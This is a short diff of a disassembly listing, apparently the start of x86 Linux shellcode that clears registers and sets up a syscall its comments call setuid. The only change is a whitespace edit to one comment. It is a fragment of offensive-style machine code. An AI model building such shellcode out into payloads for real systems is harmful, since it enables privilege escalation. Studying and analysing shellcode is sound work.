@@ -1,4 +1,4 @@
-00000000  31C9              xor ecx,ecx 			; Clear ECX
+00000000  31C9              xor ecx,ecx 			; Clear ECX 
 00000002  89CB              mov ebx,ecx 	     	; Clear EBX
 00000004  6A46              push byte +0x46 		; Push 0x46 to stack (used later for setuid syscall)
 00000006  58                pop eax 				; Pop 0x46 from stack to EAX
